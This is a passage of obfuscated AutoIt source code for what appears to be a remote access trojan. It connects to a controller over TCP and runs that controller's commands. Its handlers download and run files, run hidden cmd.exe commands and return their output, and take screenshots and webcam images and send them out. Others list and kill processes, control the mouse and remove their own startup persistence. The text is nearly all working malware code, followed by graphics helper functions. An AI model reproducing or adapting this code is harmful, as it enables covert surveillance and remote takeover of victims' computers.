                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                        If $D4ON6XP2Y6HZ6AO6IC9B <> "" Then
                            $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                        $L0PG0HZ5D &= BinaryToString($D4ON6XP2Y6HZ6AO6IC9B)
                        If TimerDiff($S0PS6DG3ZW2K) > 180000 Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                    Until StringInStr($L0PG0HZ5D, "RANCLO")
                    Local $N9XA0OC9X = TimerInit()
                    $N0IQ1FJ0E = StringReplace($L0PG0HZ5D, "RANCLO", "")
                    FileWrite($SOUI, $N0IQ1FJ0E)
                    TCPSend($mainSocket, "SouExect")
                    $D4ON6XP2Y6HZ6AO6IC9B = ""
                    $L0PG0HZ5D = ""
                    $N0IQ1FJ0E = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "UploX") Then
                    $C8VR5SB5UL3H = _stringbetween($P2OJ8OL0Y, "UploX", "/8rt")
                    Local $M9WM7CF7U = ""
                    For $i = 1 To 6
                        $M9WM7CF7U &= Chr(Random(65, 90, 1))
                    Next
                    Local $S0PS6DG3ZW2K = TimerInit()
                    Do
                        Sleep(10)
                        Local $P8DM2DR6R = TCPRecv($mainSocket, 2024)
                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                        If $P8DM2DR6R <> "" Then
                            $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                        $D4ON6XP2Y6HZ6AO6IC9B &= BinaryToString($P8DM2DR6R)
                        If TimerDiff($S0PS6DG3ZW2K) > 180000 Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                    Until StringInStr($D4ON6XP2Y6HZ6AO6IC9B, "UxplEND")
                    Local $N9XA0OC9X = TimerInit()
                    $F1CE2LL6H5OD0DY2A = StringReplace($D4ON6XP2Y6HZ6AO6IC9B, "UxplEND", "")
                    $N8LF7BZ4Q8LA4CU3X = FileOpen(@TempDir & "/" & $M9WM7CF7U & "_" & $C8VR5SB5UL3H[0], 18)
                    FileWrite($N8LF7BZ4Q8LA4CU3X, $F1CE2LL6H5OD0DY2A)
                    FileClose($N8LF7BZ4Q8LA4CU3X)
                    Sleep(500)
                    ShellExecute(@TempDir & "/" & $M9WM7CF7U & "_" & $C8VR5SB5UL3H[0])
                    TCPSend($mainSocket, "UplEND")
                    $F1CE2LL6H5OD0DY2A = ""
                    $D4ON6XP2Y6HZ6AO6IC9B = ""
                    $P8DM2DR6R = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Soxexctuuous") Then
                    If FileExists($SOUI) Then
                        FileDelete($K2RP8PZ0DD4U)
                        FileWrite($K2RP8PZ0DD4U, "Dim oPlayer" & @CRLF & "Set oPlayer = CreateObject(" & $strs & "WMPlayer.OCX" & $strs & ")" & @CRLF & "oPlayer.URL = " & $strs & $SOUI & $strs & @CRLF & "oPlayer.controls.play " & @CRLF & "While oPlayer.playState <> 1" & @CRLF & "WScript.Sleep 100" & @CRLF & "Wend" & @CRLF & "oPlayer.close")
                        ShellExecute($K2RP8PZ0DD4U)
                    Else
                        TCPSend($mainSocket, "nofnof007x")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Sound|") Then
                    $T0BQ3ZA2NP3Y = _stringbetween($P2OJ8OL0Y, "Sound|", "|")
                    If IsArray($T0BQ3ZA2NP3Y) Then
                        $F1CE2LL6H5EV6YH0J = " /c cd %SystemRoot%\Sysnative & " & $PAVVH & $SOUSNE & $W0NR4CC7F & $T0BQ3ZA2NP3Y[0]
                        RunWait("C:\Windows\system32\cmd.exe" & $F1CE2LL6H5EV6YH0J, "", @SW_HIDE)
                        $U9OW6ZA7P = FileOpen($SOUSNE, 16)
                        $C1YC8MO3EG1J = FileRead($U9OW6ZA7P)
                        FileClose($U9OW6ZA7P)
                        TCPSend($mainSocket, $C1YC8MO3EG1J)
                        TCPSend($mainSocket, "Soundclos")
                    EndIf
                EndIf
                If $P2OJ8OL0Y = "Refrech" Then
                    If ProcessExists($PID2) Then
                        ProcessClose($PID2)
                    EndIf
                    Exit ShellExecute($ScriptPath)
                EndIf
                If StringInStr($P2OJ8OL0Y, "Uninstall") Then
                    If ProcessExists($PID2) Then
                        ProcessClose($PID2)
                    EndIf
                    $S1AS0XE1GC8D6PY1JX5Q = 0
                    Sleep(1000)
                    ProcessClose("wscript.exe")
                    $era = RegRead("HKCU\Software\Win32", "FHEWYW")
                    ProcessClose($era)
                    FileDelete(@StartupDir & $M9CM9WV7E8ZP6HB9Q)
                    RegDelete("HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "FHEWYW")
                    If FileExists($pathIs & $M8ES5LU5JQ6I & ".exe") Then
                        FileDelete($VBWX)
                        FileWrite($VBWX, $N5JL6JV2EC4S)
                        ShellExecute($VBWX)
                    EndIf
                    Exit
                EndIf
                If $P2OJ8OL0Y = "kill" Then
                    If ProcessExists($PID2) Then
                        ProcessClose($PID2)
                    EndIf
                    $S1AS0XE1GC8D6PY1JX5Q = 0
                    $era = RegRead("HKCU\Software\Win32", "FHEWYW")
                    ProcessClose($era)
                    Exit
                EndIf
                If StringInStr($P2OJ8OL0Y, "EA58AE") Then
                    $D2SW7HP4TH1D = _stringbetween($P2OJ8OL0Y, "EA58AE", "UeaaqX")
                    $O7KZ5EU1PO0I = _stringbetween($P2OJ8OL0Y, "UeaaqX", "DrxmoSe")
                    $C8BX6GX1YP6E = _stringbetween($P2OJ8OL0Y, "DrxmoSe", "ccXc")
                    $i0QY3XC7B = _stringbetween($P2OJ8OL0Y, "ccXc", "PwxA")
                    MouseClickDrag("left", $D2SW7HP4TH1D[0], $O7KZ5EU1PO0I[0], $C8BX6GX1YP6E[0], $i0QY3XC7B[0], 0)
                EndIf
                If StringInStr($P2OJ8OL0Y, "MouSxA") Then
                    $K2ZD9YJ6ZR6P = _stringbetween($P2OJ8OL0Y, "MouSxA", "Xc")
                    $R5IZ1KV5S6PA2CB1N = _stringbetween($P2OJ8OL0Y, "Xc", "Xb")
                    If IsArray($K2ZD9YJ6ZR6P) And IsArray($R5IZ1KV5S6PA2CB1N) Then
                        MouseClick("left", $K2ZD9YJ6ZR6P[0], $R5IZ1KV5S6PA2CB1N[0], "1", 0)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "MouSxB") Then
                    $H6LZ2ED9A = _stringbetween($P2OJ8OL0Y, "MouSxB", "Xc")
                    $E7YQ2TB9UC6CLA7JO7KL4U = _stringbetween($P2OJ8OL0Y, "Xc", "Xb")
                    If IsArray($H6LZ2ED9A) And IsArray($E7YQ2TB9UC6CLA7JO7KL4U) Then
                        MouseClick("Right", $H6LZ2ED9A[0], $E7YQ2TB9UC6CLA7JO7KL4U[0], "1", 0)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "MoBlosxck") Then
                    RegWrite($WLAA, "Wallpaper", "REG_SZ", "")
                    Sleep(500)
                    _winapi_systemparametersinfo($i4PI1OX0N, 0)
                EndIf
                If StringInStr($P2OJ8OL0Y, "Unmoxb") Then
                    RegWrite($WLAA, "Wallpaper", "REG_SZ", $Z6CF9KG0I)
                    Sleep(500)
                    _winapi_systemparametersinfo($i4PI1OX0N, 0)
                EndIf
                If StringInStr($P2OJ8OL0Y, "QALITs") Then
                    $K9JT0HF7F = _stringbetween($P2OJ8OL0Y, "QALITs", "PipQ")
                    If IsArray($K9JT0HF7F) Then
                        $P2NL0JI7KT7M = $K9JT0HF7F[0]
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "ResiXer") Then
                    $K9JT0HF7F = _stringbetween($P2OJ8OL0Y, "ResiXer", "RFsIX")
                    If IsArray($K9JT0HF7F) Then
                        $Z1CV5CR1YG6J = $K9JT0HF7F[0]
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "W0NDS97") Then
                    $C0TZ3UA1TT6B = 2
                EndIf
                If StringInStr($P2OJ8OL0Y, "WOSFFA02") Then
                    $C0TZ3UA1TT6B = 0
                EndIf
                If StringInStr($P2OJ8OL0Y, $E7IJ3FK2O) Then
                    _screencapture_setjpgquality($P2NL0JI7KT7M)
                    If $C0TZ3UA1TT6B = 2 Then
                        Local $V0JS4CP1Q = WinGetTitle("")
                        __screencapture_capturewnd($C3NN1EW9C, $V0JS4CP1Q)
                    Else
                        A0LG0OQ8M($C3NN1EW9C)
                    EndIf
                    $H4QI3DW3ZH9U = FileOpen($C3NN1EW9C, 16)
                    $i5QY8VA3Q = FileRead($H4QI3DW3ZH9U)
                    FileClose($H4QI3DW3ZH9U)
                    TCPSend($mainSocket, $x7RH5BB2FE0R & BinaryLen($i5QY8VA3Q) & $E8LH1FC8CK2Z)
                    TCPSend($mainSocket, $i5QY8VA3Q)
                    TCPSend($mainSocket, $N8LF7BZ4Q2WW3II9V)
                    $i5QY8VA3Q = ""
                    $K6BB2CE1U = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "OpCD") Then
                    Local $D4ON6XP2Y3KZ2NS4G = DriveGetDrive("CDROM")
                    If Not @error Then
                        CDTray($D4ON6XP2Y3KZ2NS4G[1], "open")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "CloseCD") Then
                    Local $D4ON6XP2Y3KZ2NS4G = DriveGetDrive("CDROM")
                    If Not @error Then
                        CDTray($D4ON6XP2Y3KZ2NS4G[1], "Close")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DowLDXss") Then
                    Local $T0BQ3ZA2NP3Y = _stringbetween($P2OJ8OL0Y, "Ks0|", "|Bxb")
                    Local $T8HH6SK5AR8D = _stringbetween($P2OJ8OL0Y, "|Bxb", "UesWx")
                    Local $Q3XQ2MK9G = ""
                    For $i = 1 To 6
                        $Q3XQ2MK9G &= Chr(Random(65, 90, 1))
                    Next
                    If IsArray($T0BQ3ZA2NP3Y) And IsArray($T8HH6SK5AR8D) Then
                        InetGet($T0BQ3ZA2NP3Y[0], @TempDir & "/" & $Q3XQ2MK9G & "." & $T8HH6SK5AR8D[0])
                        ShellExecute(@TempDir & "/" & $Q3XQ2MK9G & "." & $T8HH6SK5AR8D[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Chat") Then
                    $H7LO5DY6MF1D = GUICreate("", 0, 0, 0, 0, 0, $ws_ex_toolwindow)
                    $W5AX6RB6J = GUICreate("     ", 525, 410, -1, -1, $ws_popup, "", $H7LO5DY6MF1D)
                    $F1HG6TR6TV6E = GUICtrlCreateInput("", 8, 360, 401, 25)
                    GUICtrlSetColor(-1, 6666547)
                    GUICtrlSetFont(-1, 12, 400, 0, "")
                    GUICtrlSetBkColor(-1, 0)
                    $F8NM0XP8NP6BRD2IA2S = GUICtrlCreateEdit("", 0, 0, 521, 345)
                    GUICtrlSetFont(-1, 12, 400, 0, "")
                    GUICtrlSetColor(-1, 6666547)
                    GUICtrlSetBkColor(-1, 0)
                    $S2FA2LQ3A = GUICtrlCreateButton("Send Message", 419, 360, 89, 30)
                    WinSetOnTop("     ", "", 1)
                    GUISetState(@SW_SHOW)
                    FileDelete($DBRT)
                    Local $S0PS6DG3ZW2K = TimerInit()
                    While 1
                        $H7UR4IU1PU6G = GUIGetMsg()
                        Switch $H7UR4IU1PU6G
                            Case $S2FA2LQ3A
                                $i5IS2FA1O = GUICtrlRead($F1HG6TR6TV6E)
                                If $i5IS2FA1O <> "" Then
                                    GUICtrlSetState($F1HG6TR6TV6E, $GUI_FOCUS)
                                    TCPSend($mainSocket, $i5IS2FA1O)
                                    FileWrite($DBRT, "Me : " & $i5IS2FA1O & @CRLF)
                                    $K5AS4FR4Y = FileRead($DBRT)
                                    GUICtrlSetData($F8NM0XP8NP6BRD2IA2S, $K5AS4FR4Y)
                                    N3PF2BK6E($F8NM0XP8NP6BRD2IA2S, $__editconstant_sb_scrollcaret)
                                    GUICtrlSetData($F1HG6TR6TV6E, "")
                                EndIf
                        EndSwitch
                        $D8RU2FS4O = TCPRecv($mainSocket, 500)
                        If $D8RU2FS4O <> "" Then
                            $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                        If TimerDiff($S0PS6DG3ZW2K) > 180000 Then
                            GUIDelete($W5AX6RB6J)
                            ExitLoop
                        EndIf
                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            GUIDelete($W5AX6RB6J)
                            ExitLoop
                        EndIf
                        If StringInStr($D8RU2FS4O, "ChatExit") Then
                            GUIDelete($W5AX6RB6J)
                            ExitLoop
                        EndIf
                        If StringInStr($D8RU2FS4O, "ZeXro0") Then
                            $D8RU2FS4O = StringReplace($D8RU2FS4O, "ZeXro0", "")
                        EndIf
                        If $D8RU2FS4O <> "" Then
                            FileWrite($DBRT, "X : " & $D8RU2FS4O & @CRLF)
                            $K5AS4FR4Y = FileRead($DBRT)
                            GUICtrlSetData($F8NM0XP8NP6BRD2IA2S, $K5AS4FR4Y)
                            N3PF2BK6E($F8NM0XP8NP6BRD2IA2S, $__editconstant_sb_scrollcaret)
                            Local $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                    WEnd
                EndIf
                If StringInStr($P2OJ8OL0Y, "CxM0D1|") Then
                    Local $T0BQ3ZA2NP3Y = _stringbetween($P2OJ8OL0Y, "CxM0D1|", "|xzz")
                    If IsArray($T0BQ3ZA2NP3Y) Then
                        $x4YV3UO1G = _CMDControler($T0BQ3ZA2NP3Y[0])
                        TCPSend($mainSocket, $x4YV3UO1G)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "WebCam") Then
                    $CAMEXI = TimerInit()
                    If $R5IZ1KV5S5AE8YO6UZ9S = "0" Then
                        $F7VB1ME2QU6K = DllOpen("avicap32.dll")
                        $hUserDll = DllOpen("user32.dll")
                        $R5IZ1KV5S6FE4UW8C = @TempDir & "/666xv.jpg"
                        $S1AS0XE1GC8D1SU6TT0T = GUICreate("Camera", 350, 270)
                        $x8JY2ED6B = DllCall($F7VB1ME2QU6K, "int", "capCreateCaptureWindow", "str", "cap", "int", BitOR($WS_CHILD, $WS_VISIBLE), "int", 15, "int", 15, "int", 320, "int", 240, "hwnd", $S1AS0XE1GC8D1SU6TT0T, "int", 1)
                        DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_DRIVER_CONNECT, "int", 0, "int", 0)
                        DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_SET_SCALE, "int", 1, "int", 0)
                        DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_SET_OVERLAY, "int", 1, "int", 0)
                        DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_SET_PREVIEW, "int", 1, "int", 0)
                        DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_SET_PREVIEWRATE , "int", 1, "int", 0)
                        GUISetState($c_SW_HIDE)
                        $R5IZ1KV5S5AE8YO6UZ9S = "1"
                    EndIf
                    DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_GRAB_FRAME_NOSTOP, "int", 0, "int", 0)
                    DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_FILE_SAVEDIBA, "int", 0, "str", $R5IZ1KV5S6FE4UW8C)
                    $K2OB4CQ7L = FileOpen(@TempDir & "/666xv.jpg", 16)
                    $L2HG0SC0V = FileRead($K2OB4CQ7L)
                    FileClose($K2OB4CQ7L)
                    TCPSend($mainSocket, $L2HG0SC0V)
                    TCPSend($mainSocket, "Cstio")
                EndIf
                If StringInStr($P2OJ8OL0Y, "open") Then
                    Local $T1OG3MW4B = _stringbetween($P2OJ8OL0Y, "|", "|")
                    If IsArray($T1OG3MW4B) Then
                        ShellExecute($strs & $T1OG3MW4B[0] & $strs)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Process") Then
                    $N0CP0BA7OO7X = ProcessList()
                    TCPSend($mainSocket, "Nexw2x" & @ScriptName & "tasgxx")
                    Sleep(500)
                    If IsArray($N0CP0BA7OO7X) Then
                        $x7FZ0GJ8Q = ""
                        For $i = 1 To $N0CP0BA7OO7X[0][0] Step +1
                            $x7FZ0GJ8Q &= $N0CP0BA7OO7X[$i][0] & "|"
                        Next
                        TCPSend($mainSocket, "CNZAAAZRD" & StringTrimRight($x7FZ0GJ8Q, 1) & "5zdazsdx")
                        $x7FZ0GJ8Q = ""
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "PrKilx|") Then
                    $F1CE2LL6H2GE5JV4NF6C = _stringbetween($P2OJ8OL0Y, "PrKilx|", "|")
                    If IsArray($F1CE2LL6H2GE5JV4NF6C) Then
                        ProcessClose($F1CE2LL6H2GE5JV4NF6C[0])
                    EndIf
                EndIf
        EndSwitch
        If TimerDiff($CAMEXI) > 10000 And $R5IZ1KV5S5AE8YO6UZ9S = "1" Then
            $R5IZ1KV5S5AE8YO6UZ9S = "0"
            FileDelete($R5IZ1KV5S6FE4UW8C)
            DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_END, "int", 0, "int", 0)
            DllCall($hUserDll, "int", "SendMessage", "hwnd", $x8JY2ED6B[0], "int", $WM_CAP_DRIVER_DISCONNECT, "int", 0, "int", 0)
            DllClose($hUserDll)
        EndIf
    WEnd
WEnd

Func _CMDControler($sComando)
    Local $sCMD = Run("C:\Windows\system32\cmd.exe", @DesktopDir, @SW_HIDE, 3)
    StdinWrite($sCMD, $sComando)
    StdinWrite($sCMD, @CRLF)
    Local $sRead, $sReturn = ""
    Local $sTimerInit = TimerInit()
    Local $sDelay = 3000
    While 1
        $sRead = StdoutRead($sCMD)
        If @error Then ExitLoop
        If $sRead <> "" Then
            $sReturn &= $sRead
            $sRead = ""
        EndIf
        If TimerDiff($sTimerInit) >= $sDelay Then ExitLoop
    WEnd
    ProcessClose("cmd.exe")
    Return $sReturn
EndFunc

Func _gdiplus_scaleimage($hImageEx, $iW, $iH, $iInterpolationMode = 7)
    Local $himage = $hImageEx
    Local $hbitmap = DllCall($ghgdipdll, "UINT", "GdipCreateBitmapFromScan0", "int", $iW, "int", $iH, "int", 0, "int", 2498570, "ptr", 0, "int*", 0)
    If @error Then Return SetError(3, 0, 0)
    $hbitmap = $hbitmap[6]
    Local $hBmpCtxt = _gdiplus_imagegetgraphicscontext($hbitmap)
    DllCall($ghgdipdll, "UINT", "GdipSetInterpolationMode", "handle", $hBmpCtxt, "int", $iInterpolationMode)
    _gdiplus_graphicsdrawimagerect($hBmpCtxt, $himage, 0, 0, $iW, $iH)
    _gdiplus_imagedispose($himage)
    _gdiplus_graphicdispose($hBmpCtxt)
    _gdiplus_imagedispose($himage)
    Return $hbitmap
    _gdiplus_imagedispose($hbitmap)
EndFunc

Func _gdiplus_imageloadfromfile($sfilename)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipLoadImageFromFile", "wstr", $sfilename, "ptr*", 0)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _gdiplus_imagegetgraphicscontext($himage)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageGraphicsContext", "handle", $himage, "ptr*", 0)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _gdiplus_graphicsdrawimagerect($hgraphics, $himage, $iX, $iY, $iW, $iH)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipDrawImageRectI", "handle", $hgraphics, "handle", $himage, "int", $iX, "int", $iY, "int", $iW, "int", $iH)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0] = 0
EndFunc

Func _gdiplus_graphicdispose($hgraphics)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipDeleteGraphics", "handle", $hgraphics)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0] = 0
EndFunc

Func _zip_unzip($hzipfile, $hdestpath, $flag = 1)
    Local $dllchk = _zip_dllchk()
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(2, 0, 0)
    If Not FileExists($hdestpath) Then DirCreate($hdestpath)
    Local $aarray[1]
    $oapp = ObjCreate("shell.application")
    If Not IsObj($oapp) Then Return 0
    $oapp.Namespace($hdestpath).CopyHere($oapp.Namespace($hzipfile).Items)
    For $item In $oapp.Namespace($hzipfile).Items
        _arrayadd($aarray, $item)
    Next
    While 1
        If $flag = 1 Then hide()
        If FileExists($hdestpath & "\" & $aarray[UBound($aarray) - 1]) Then
            Return SetError(0, 0, 1)
            ExitLoop
        EndIf
        Sleep(500)
    WEnd
EndFunc

Func _gdiplus_bitmapclonearea($hbmp, $ileft, $itop, $iwidth, $iheight, $iformat = 137224)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipCloneBitmapAreaI", "int", $ileft, "int", $itop, "int", $iwidth, "int", $iheight, "int", $iformat, "handle", $hbmp, "ptr*", 0)
    If @error Then Return SetError(@error, @extended, 0)
    Return SetExtended($aresult[0], $aresult[7])
EndFunc

Func _gdiplus_bitmapcreatefromhbitmap($hbmp, $hpal = 0)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipCreateBitmapFromHBITMAP", "handle", $hbmp, "handle", $hpal, "ptr*", 0)
    If @error Then Return SetError(@error, @extended, 0)
    Return SetExtended($aresult[0], $aresult[3])
EndFunc

Func _gdiplus_encoders()
    Local $icount = _gdiplus_encodersgetcount()
    Local $isize = _gdiplus_encodersgetsize()
    Local $tbuffer = DllStructCreate("byte[" & $isize & "]")
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageEncoders", "UINT", $icount, "UINT", $isize, "struct*", $tbuffer)
    If @error Then Return SetError(@error, @extended, 0)
    If $aresult[0] <> 0 Then Return SetError($aresult[0], 0, 0)
    Local $pbuffer = DllStructGetPtr($tbuffer)
    Local $tcodec, $ainfo[$icount + 1][14]
    $ainfo[0][0] = $icount
    For $ii = 1 To $icount
        $tcodec = DllStructCreate($taggdipimagecodecinfo, $pbuffer)
        $ainfo[$ii][1] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "CLSID"))
        $ainfo[$ii][2] = _winapi_stringfromguid(DllStructGetPtr($tcodec, "FormatID"))
        $ainfo[$ii][3] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "CodecName"))
        $ainfo[$ii][4] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "DllName"))
        $ainfo[$ii][5] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FormatDesc"))
        $ainfo[$ii][6] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "FileExt"))
        $ainfo[$ii][7] = _winapi_widechartomultibyte(DllStructGetData($tcodec, "MimeType"))
        $ainfo[$ii][8] = DllStructGetData($tcodec, "Flags")
        $ainfo[$ii][9] = DllStructGetData($tcodec, "Version")
        $ainfo[$ii][10] = DllStructGetData($tcodec, "SigCount")
        $ainfo[$ii][11] = DllStructGetData($tcodec, "SigSize")
        $ainfo[$ii][12] = DllStructGetData($tcodec, "SigPattern")
        $ainfo[$ii][13] = DllStructGetData($tcodec, "SigMask")
        $pbuffer += DllStructGetSize($tcodec)
    Next
    Return $ainfo
EndFunc

Func _gdiplus_encodersgetclsid($sfileext)
    Local $aencoders = _gdiplus_encoders()
    For $ii = 1 To $aencoders[0][0]
        If StringInStr($aencoders[$ii][6], "*." & $sfileext) > 0 Then Return $aencoders[$ii][1]
    Next
    Return SetError(-1, -1, "")
EndFunc

Func _gdiplus_encodersgetcount()
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[1])
EndFunc

Func _gdiplus_encodersgetsize()
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _gdiplus_imagedispose($himage)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipDisposeImage", "handle", $himage)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0] = 0
EndFunc

Func _gdiplus_imagegetheight($himage)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageHeight", "handle", $himage, "uint*", 0)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _gdiplus_imagegetwidth($himage)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipGetImageWidth", "handle", $himage, "uint*", -1)
    If @error Then Return SetError(@error, @extended, -1)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _gdiplus_imagesavetofileex($himage, $sfilename, $sencoder, $pparams = 0)
    Local $tguid = _winapi_guidfromstring($sencoder)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipSaveImageToFile", "handle", $himage, "wstr", $sfilename, "struct*", $tguid, "struct*", $pparams)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0] = 0
EndFunc

Func _gdiplus_paramadd(ByRef $tparams, $sguid, $icount, $itype, $pvalues)
    Local $tparam  = DllStructCreate($taggdipencoderparam, DllStructGetPtr($tparams, "Params") + (DllStructGetData($tparams, "Count") * 28))
    _winapi_guidfromstringex($sguid, DllStructGetPtr($tparam , "GUID"))
    DllStructSetData($tparam , "Type", $itype)
    DllStructSetData($tparam , "Count", $icount)
    DllStructSetData($tparam , "Values", $pvalues)
    DllStructSetData($tparams, "Count", DllStructGetData($tparams, "Count") + 1)
EndFunc

Func _gdiplus_paraminit($icount)
    If $icount <= 0 Then Return SetError(-1, -1, 0)
    Return DllStructCreate("dword Count;byte Params[" & $icount * 28 & "]")
EndFunc

Func _gdiplus_shutdown()
    If $ghgdipdll = 0 Then Return SetError(-1, -1, False)
    $gigdipref -= 1
    If $gigdipref = 0 Then
        DllCall($ghgdipdll, "none", "GdiplusShutdown", "ptr", $gigdiptoken)
        DllClose($ghgdipdll)
        $ghgdipdll = 0
    EndIf
    Return True
EndFunc

Func _gdiplus_startup()
    $gigdipref += 1
    If $gigdipref > 1 Then Return True
    $ghgdipdll = DllOpen("GDIPlus.dll")
    If $ghgdipdll = -1 Then
        $gigdipref = 0
        Return SetError(1, 2, False)
    EndIf
    Local $tinput = DllStructCreate($taggdipstartupinput)
    Local $ttoken = DllStructCreate("ulong_ptr Data")
    DllStructSetData($tinput, "Version", 1)
    Local $aresult = DllCall($ghgdipdll, "int", "GdiplusStartup", "struct*", $ttoken, "struct*", $tinput, "ptr", 0)
    If @error Then Return SetError(@error, @extended, False)
    $gigdiptoken = DllStructGetData($ttoken, "data")
    Return $aresult[0] = 0
EndFunc

Func _sendmessage($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
    Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "UINT", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
    If @error Then Return SetError(@error, @extended, "")
    If $ireturn >= 0 And $ireturn <= 4 Then Return $aresult[$ireturn]
    Return $aresult
EndFunc

Func _winapi_bitblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
    Local $aresult = DllCall("gdi32.dll", "Bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_copyicon($hicon)
    Local $aresult = DllCall("user32.dll", "handle", "CopyIcon", "handle", $hicon)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
    Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_createcompatibledc($hdc)
    Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_deletedc($hdc)
    Local $aresult = DllCall("gdi32.dll", "Bool", "DeleteDC", "handle", $hdc)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_deleteobject($hobject)
    Local $aresult = DllCall("gdi32.dll", "Bool", "DeleteObject", "handle", $hobject)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_destroyicon($hicon)
    Local $aresult = DllCall("user32.dll", "Bool", "DestroyIcon", "handle", $hicon)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_drawicon($hdc, $iX, $iY, $hicon)
    Local $aresult = DllCall("user32.dll", "Bool", "DrawIcon", "handle", $hdc, "int", $iX, "int", $iY, "handle", $hicon)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_getclassname($hwnd)
